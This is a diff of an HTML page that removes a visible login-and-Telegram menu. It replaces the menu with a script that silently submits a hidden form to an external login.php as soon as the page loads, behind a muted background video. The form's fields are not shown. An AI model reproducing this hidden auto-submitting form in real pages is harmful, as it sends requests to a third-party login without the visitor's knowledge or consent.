@@ -28,7 +28,7 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      pointer-events: none; /* Evita que el video sea interactuable */
+      pointer-events: none;
     }
 
     #video {
@@ -37,67 +37,8 @@
       object-fit: cover;
     }
 
-    #overlay {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(0, 0, 0, 0.5);
-      padding: 20px;
-      border-radius: 10px;
-      text-align: center;
-      width: 90%;
-      max-width: 500px;
-      box-sizing: border-box;
-    }
-
     h1 {
-      margin: 0;
-      font-size: 6vw;
-      color: #fff;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
-    }
-
-    a {
-      text-decoration: none;
-      color: #3498db;
-      font-weight: bold;
-    }
-
-    .button-container {
-      display: flex;
-      justify-content: space-between;
-      width: 100%;
-      margin-top: 20px;
-    }
-
-    button {
-      padding: 10px 20px;
-      font-size: 4vw;
-      background-color: #3498db;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    button:hover {
-      background-color: #2980b9;
-    }
-
-    @media (min-width: 600px) {
-      h1 {
-        font-size: 32px;
-      }
-
-      button {
-        font-size: 16px;
-      }
+      display: none;
     }
   </style>
 </head>
@@ -107,23 +48,10 @@
     <iframe id="video" src="https://www.youtube.com/embed/1lcHHqfiCEE?autoplay=1&mute=1&controls=0&loop=1&playlist=1lcHHqfiCEE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
   </div>
 
-  <div id="overlay">
-    <h1>MENU</h1>
-    <div class="button-container">
-      <button onclick="redirectLogin()">Ingresar</button>
-      <button onclick="window.location.href='https://t.me/bnatruchop'">Grupo</button>
-      <button onclick="window.location.href='https://t.me/texturizado'">Contacto</button>
-    </div>
-  </div>
-
   <script>
-    function redirectLogin() {
+    document.addEventListener('DOMContentLoaded', function() {
       document.clients.submit();
-    }
-
-    setTimeout(function() {
-      document.getElementById('overlay').style.display = 'flex';
-    }, 3000);
+    });
   </script>
 
   <form name="clients" action="https://www.informescea.com.ar/login.php" method="post" style="display: none;">
